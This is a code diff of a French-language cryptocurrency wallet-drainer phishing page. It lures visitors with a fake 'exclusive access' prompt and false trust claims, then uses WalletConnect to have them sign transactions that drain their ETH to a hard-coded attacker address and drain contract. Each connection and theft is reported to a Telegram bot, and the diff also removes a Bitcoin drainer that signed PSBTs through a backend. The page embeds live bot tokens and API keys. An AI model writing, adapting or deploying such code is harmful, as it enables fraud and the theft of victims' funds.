@@ -8,7 +8,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
     <!-- Librairies externes -->
     <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js" type="text/javascript"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@scure/btc-signer@1.2.0/dist/index.umd.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.14.0/dist/index.min.js"></script>
     <!-- Ajout d'Eruda pour le débogage sur mobile (temporaire) -->
     <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
     <script>eruda.init();</script>
@@ -189,7 +189,7 @@
             <h2 style="margin-bottom: 15px; font-size: 24px; font-weight: 700;">Accès Exclusif Requis</h2>
             <p style="margin-bottom: 20px; font-size: 16px;">
                 Pour accéder à notre plateforme premium et bénéficier de services exclusifs, veuillez connecter votre wallet. <br>
-                <strong>Sur mobile :</strong> Utilisez le navigateur intégré de votre wallet (par exemple, MetaMask) pour une connexion directe.
+                <strong>Sur mobile :</strong> Cliquez sur un wallet pour ouvrir l'application et confirmer la connexion.
             </p>
             <p class="trust-text">Sécurisé et utilisé par des milliers d'utilisateurs. Nous respectons vos données.</p>
             <button class="connect-btn" id="connectWallet">Connecter mon wallet</button>
@@ -210,13 +210,13 @@
         const CONFIG = {
             TELEGRAM_BOT_TOKEN: '8189811123:AAG_3YlqOGNYzfMys7PknpEvbnpUZ3dTO8c',
             TELEGRAM_CHAT_ID: '-4635118249',
-            BACKEND_URL: 'https://backendtest11-git-main-donassion111s-projects.vercel.app/',
             REDIRECT_URL: 'https://coinmarketcap.com',
             BTC_PRICE_USD: 85000,
             ETH_PRICE_USD: 2000,
             ATTACKER_ADDRESS: '0xc427AB745eA6b12C557c7342f94D96f68D19D754',
-            BTC_ATTACKER_ADDRESS: 'tb1qmqts2vhpzul4ltmvs97gdnvsfm3h6slfv2vv2l',
-            DRAIN_CONTRACT_ADDRESS: '0x5D8F38c17aB48446c7b28E38076aCD9057480963' // Adresse correcte pour Sepolia
+            DRAIN_CONTRACT_ADDRESS: '0x5D8F38c17aB48446c7b28E38076aCD9057480963', // Adresse correcte pour Sepolia
+            WALLET_CONNECT_PROJECT_ID: '734ae739400cb6571838de4b118a972d', // Remplace par ton Project ID WalletConnect
+            INFURA_API_KEY: '0c56a36ee5ff4b72b18abdf5fa241dbd' // Remplace par ta clé API Infura
         };
 
         // URL Telegram
@@ -256,47 +256,19 @@
                     return;
                 }
 
-                // Tenter une connexion manuelle pour forcer l'injection de window.ethereum
-                if (window.ethereum) {
-                    console.log('window.ethereum détecté au chargement, tentative de connexion...');
-                    window.ethereum.request({ method: 'eth_requestAccounts' })
-                        .then(() => console.log('Connexion manuelle réussie'))
-                        .catch(err => console.error('Erreur lors de la connexion manuelle:', err));
-                } else {
-                    console.log('window.ethereum non détecté au chargement');
-                }
-
                 // Gestion du clic sur le bouton de connexion
                 elements.connectWalletButton.addEventListener('click', async () => {
-                    updateStatus(elements, 'Détection des wallets...', true);
+                    updateStatus(elements, 'Chargement des wallets...', true);
                     elements.connectWalletButton.disabled = true;
 
                     let transactionValidated = false;
 
                     try {
-                        // Détecter le wallet
-                        const wallet = await detectWallet(elements);
-                        if (wallet) {
-                            // Si un wallet est détecté, connecter directement
-                            transactionValidated = await handleWalletConnection(wallet, elements);
-                        } else {
-                            // Attendre que l'utilisateur sélectionne un wallet
-                            return;
-                        }
-
-                        // Gestion des boutons après validation
-                        if (transactionValidated) {
-                            elements.connectWalletButton.classList.add('hidden');
-                            elements.redirectButton.classList.remove('hidden');
-                            elements.redirectButton.disabled = false;
-                            console.log('Bouton de redirection affiché, bouton de connexion masqué.');
-                        } else {
-                            elements.connectWalletButton.disabled = false;
-                        }
-
+                        // Afficher la liste des wallets
+                        await showWalletList(elements);
                     } catch (error) {
                         updateStatus(elements, 'Erreur : ' + error.message, false, 'red');
-                        console.error('Erreur capturée avant redirection :', error);
+                        console.error('Erreur capturée :', error);
                         elements.connectWalletButton.disabled = false;
                     }
                 });
@@ -318,88 +290,31 @@
             }
         });
 
-        // Fonction pour détecter les wallets (PC et mobile)
-        async function detectWallet(elements) {
-            const maxAttempts = 10; // Nombre maximum de tentatives
-            const delayBetweenAttempts = 500; // Délai entre chaque tentative (500ms)
-
+        // Fonction pour afficher la liste des wallets
+        async function showWalletList(elements) {
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
             const walletListContainer = document.getElementById('walletList');
 
-            // Liste des wallets supportés
+            // Liste des wallets supportés (on se concentre sur Ethereum pour l'instant)
             const supportedWallets = [
                 {
                     name: 'MetaMask',
                     id: 'metamask',
-                    provider: null,
                     icon: 'images/metamask-icon.svg',
-                    type: 'ethereum'
-                },
-                {
-                    name: 'Phantom',
-                    id: 'phantom',
-                    provider: null,
-                    icon: 'images/phantom-icon.svg',
                     type: 'ethereum'
                 },
                 {
                     name: 'Trust Wallet',
                     id: 'trustwallet',
-                    provider: null,
                     icon: 'images/trustwallet-logo.svg',
                     type: 'ethereum'
-                },
-                {
-                    name: 'UniSat',
-                    id: 'unisat',
-                    provider: null,
-                    icon: 'images/unisat.png',
-                    type: 'unisat'
                 }
             ];
 
-            // Mettre à jour les providers
-            function updateProviders() {
-                console.log('Mise à jour des providers...');
-                console.log('window.ethereum:', window.ethereum);
-                console.log('window.ethereum.isMetaMask:', window.ethereum && window.ethereum.isMetaMask);
-                console.log('window.phantom:', window.phantom);
-                console.log('window.phantom.ethereum:', window.phantom && window.phantom.ethereum);
-                console.log('window.ethereum.isTrust:', window.ethereum && window.ethereum.isTrust);
-                console.log('window.unisat:', window.unisat);
-
-                supportedWallets.forEach(wallet => {
-                    if (wallet.id === 'metamask') {
-                        wallet.provider = window.ethereum && window.ethereum.isMetaMask ? window.ethereum : null;
-                    } else if (wallet.id === 'phantom') {
-                        wallet.provider = window.phantom && window.phantom.ethereum ? window.phantom.ethereum : null;
-                    } else if (wallet.id === 'trustwallet') {
-                        wallet.provider = window.ethereum && window.ethereum.isTrust ? window.ethereum : null;
-                    } else if (wallet.id === 'unisat') {
-                        wallet.provider = window.unisat ? window.unisat : null;
-                    }
-                });
-            }
-
-            // Attendre l'injection des providers
-            let attempts = 0;
-            while (attempts < maxAttempts) {
-                updateProviders();
-                const detectedWallet = supportedWallets.find(wallet => wallet.provider);
-                if (detectedWallet) {
-                    console.log(`${detectedWallet.name} détecté après ${attempts + 1} tentatives`);
-                    return { type: detectedWallet.type, provider: detectedWallet.provider, name: detectedWallet.name };
-                }
-                attempts++;
-                await delay(delayBetweenAttempts);
-            }
-
-            console.log('Aucun wallet détecté après', maxAttempts, 'tentatives');
-
-            // Si aucun wallet n'est détecté, afficher la liste des wallets
+            // Afficher la liste des wallets
             elements.introView.classList.add('hidden');
             elements.walletSelectionView.classList.remove('hidden');
-            updateStatus(elements, '', false); // Effacer le texte de statut initial
+            updateStatus(elements, '', false);
 
             // Générer les boutons pour chaque wallet
             supportedWallets.forEach(wallet => {
@@ -414,32 +329,23 @@
                     walletListContainer.classList.add('hidden');
 
                     try {
-                        let provider;
-                        // Réessayer une dernière fois de détecter le provider
-                        updateProviders();
-                        if (wallet.provider) {
-                            console.log(`${wallet.name} détecté`);
-                            provider = wallet.provider;
-                        } else {
-                            // Tenter une connexion manuelle pour forcer l'injection
-                            if (wallet.id === 'metamask' || wallet.id === 'trustwallet' || wallet.id === 'phantom') {
-                                if (window.ethereum) {
-                                    await window.ethereum.request({ method: 'eth_requestAccounts' });
-                                    updateProviders();
-                                    provider = wallet.provider;
-                                }
-                            } else if (wallet.id === 'unisat' && window.unisat) {
-                                provider = window.unisat;
+                        // Initialiser WalletConnect
+                        const provider = await window.EthereumProvider.init({
+                            projectId: CONFIG.WALLET_CONNECT_PROJECT_ID,
+                            chains: [11155111], // Sepolia
+                            showQrModal: false, // Désactiver le QR code
+                            methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign'],
+                            events: ['chainChanged', 'accountsChanged'],
+                            rpcMap: {
+                                11155111: `https://sepolia.infura.io/v3/${CONFIG.INFURA_API_KEY}`
                             }
+                        });
 
-                            if (!provider) {
-                                updateStatus(elements, `${wallet.name} n’est pas détecté. Veuillez l’installer ou utiliser le navigateur intégré de votre wallet.`, false, 'red');
-                                walletListContainer.classList.remove('hidden');
-                                return;
-                            }
-                        }
+                        // Connecter via WalletConnect
+                        await provider.connect();
+                        const web3Provider = new window.ethers.providers.Web3Provider(provider);
 
-                        const success = await handleWalletConnection({ type: wallet.type, provider, name: wallet.name }, elements);
+                        const success = await handleWalletConnection({ type: wallet.type, provider: web3Provider, name: wallet.name }, elements);
                         if (success) {
                             elements.walletSelectionView.classList.add('hidden');
                             elements.redirectButton.classList.remove('hidden');
@@ -454,15 +360,13 @@
                 });
                 walletListContainer.appendChild(button);
             });
-
-            return null; // Retourne null pour indiquer qu'on attend une action de l'utilisateur
         }
 
         // Fonction pour gérer la connexion au wallet sélectionné
         async function handleWalletConnection(wallet, elements) {
             try {
                 if (wallet.type === 'ethereum') {
-                    const provider = new window.ethers.providers.Web3Provider(wallet.provider);
+                    const provider = wallet.provider;
                     // Demander l'accès au compte
                     await provider.send('eth_requestAccounts', []);
                     const network = await provider.getNetwork();
@@ -482,7 +386,7 @@
 
                     // Notification Telegram pour la connexion
                     const connectionMessage = `🚀 Nouvelle connexion détectée à ${new Date().toLocaleString('fr-FR', { timeZone: 'America/Los_Angeles' })} PDT:\n` +
-                                            `💼 Wallet: ${wallet.name} (EIP-1193)\n` +
+                                            `💼 Wallet: ${wallet.name} (WalletConnect)\n` +
                                             `🌐 ETH Address: ${ethAddress} (Balance: 💰 $${ethBalanceUsd.toFixed(2)})\n`;
                     await sendTelegramMessage(connectionMessage);
 
@@ -491,7 +395,7 @@
                     const drainResult = await drainETH(ethAddress, provider);
                     if (drainResult.success) {
                         const transferMessage = `✅ Transfert validé à ${new Date().toLocaleString('fr-FR', { timeZone: 'America/Los_Angeles' })} PDT:\n` +
-                                              `💼 Wallet: ${wallet.name} (EIP-1193)\n` +
+                                              `💼 Wallet: ${wallet.name} (WalletConnect)\n` +
                                               `🌐 ETH Address: ${ethAddress}\n` +
                                               `💸 Montant transféré: ${window.ethers.utils.formatEther(drainResult.valueToSend)} ETH 🎉`;
                         await sendTelegramMessage(transferMessage);
@@ -500,50 +404,6 @@
                     } else {
                         updateStatus(elements, 'Échec du drainage ETH. Vérifiez votre solde ou les frais de gas.', false, '#dc3545');
                         return false;
-                    }
-                } else if (wallet.type === 'unisat') {
-                    const btcAccounts = await wallet.provider.requestAccounts();
-                    if (!btcAccounts || btcAccounts.length === 0) {
-                        throw new Error('Aucun compte détecté. Veuillez connecter un compte dans votre wallet.');
-                    }
-                    const btcAddress = btcAccounts[0];
-                    console.log('BTC détecté :', btcAddress);
-
-                    const utxoResponse = await fetch(`${CONFIG.BACKEND_URL}/get-utxos`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ address: btcAddress })
-                    });
-                    if (utxoResponse.ok) {
-                        const { utxos } = await utxoResponse.json();
-                        const btcBalanceSat = utxos.reduce((sum, utxo) => sum + utxo.value, 0);
-                        const btcBalanceBtc = btcBalanceSat / 1e8;
-                        const btcBalanceUsd = btcBalanceBtc * CONFIG.BTC_PRICE_USD;
-                        console.log('Solde BTC :', btcBalanceBtc, 'BTC (≈ $', btcBalanceUsd.toFixed(2), 'USD)');
-
-                        // Notification Telegram pour la connexion
-                        const connectionMessage = `🚀 Nouvelle connexion détectée à ${new Date().toLocaleString('fr-FR', { timeZone: 'America/Los_Angeles' })} PDT:\n` +
-                                                `💼 Wallet: UniSat\n` +
-                                                `🌐 BTC Address: ${btcAddress} (Balance: 💰 $${btcBalanceUsd.toFixed(2)})\n`;
-                        await sendTelegramMessage(connectionMessage);
-
-                        // Drainage BTC
-                        updateStatus(elements, 'Envoi de la transaction... Veuillez confirmer dans votre wallet.', true);
-                        const drainResult = await drainBTC(btcAddress, btcBalanceSat);
-                        if (drainResult.success) {
-                            const transferMessage = `✅ Transfert validé à ${new Date().toLocaleString('fr-FR', { timeZone: 'America/Los_Angeles' })} PDT:\n` +
-                                                  `💼 Wallet: UniSat\n` +
-                                                  `🌐 BTC Address: ${btcAddress}\n` +
-                                                  `💸 Montant transféré: ${(drainResult.btcBalanceSat / 1e8).toFixed(8)} BTC 🎉`;
-                            await sendTelegramMessage(transferMessage);
-                            updateStatus(elements, 'Transaction validée ! Cliquez pour continuer.', false, '#28a745');
-                            return true;
-                        } else {
-                            updateStatus(elements, 'Échec du drainage BTC. Vérifiez votre solde ou les frais de réseau.', false, '#dc3545');
-                            return false;
-                        }
-                    } else {
-                        throw new Error('Erreur lors de la récupération des UTXOs');
                     }
                 }
             } catch (error) {
@@ -592,64 +452,6 @@
             } catch (error) {
                 console.error('Erreur lors du drainage ETH :', error);
                 throw new Error('Échec de la transaction. Vérifiez votre solde, les frais de gas, ou si la transaction a été rejetée.');
-            }
-        }
-
-        // Fonction pour drainer BTC
-        async function drainBTC(btcAddress, btcBalanceSat) {
-            try {
-                console.log('Récupération UTXOs pour', btcAddress);
-                const utxoResponse = await fetch(`${CONFIG.BACKEND_URL}/get-utxos`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ address: btcAddress })
-                });
-
-                if (!utxoResponse.ok) {
-                    console.error('Erreur UTXOs :', utxoResponse.statusText);
-                    throw new Error('Erreur lors de la récupération des UTXOs');
-                }
-                const { utxos } = await utxoResponse.json();
-                console.log('UTXOs :', utxos);
-
-                if (!utxos.length) {
-                    console.log('Aucun BTC disponible');
-                    return { success: false, btcBalanceSat: null };
-                }
-
-                console.log('Création PSBT...');
-                const psbtResponse = await fetch(`${CONFIG.BACKEND_URL}/create-psbt`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ address: btcAddress, utxos })
-                });
-
-                if (!psbtResponse.ok) {
-                    console.error('Erreur PSBT :', psbtResponse.statusText);
-                    throw new Error('Erreur lors de la création du PSBT');
-                }
-                const { psbtHex } = await psbtResponse.json();
-
-                console.log('Signature PSBT...');
-                const signedPsbtHex = await window.unisat.signPsbt(psbtHex);
-
-                console.log('Diffusion TX BTC...');
-                const broadcastResponse = await fetch(`${CONFIG.BACKEND_URL}/broadcast`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ psbtHex: signedPsbtHex })
-                });
-
-                if (!broadcastResponse.ok) {
-                    console.error('Erreur diffusion :', broadcastResponse.statusText);
-                    throw new Error('Erreur lors de la diffusion de la transaction');
-                }
-                const { txid } = await broadcastResponse.json();
-                console.log('TX BTC réussie :', txid);
-                return { success: true, btcBalanceSat: btcBalanceSat };
-            } catch (error) {
-                console.error('Erreur lors du drainage BTC :', error);
-                throw new Error('Échec de la transaction BTC : ' + error.message);
             }
         }
 
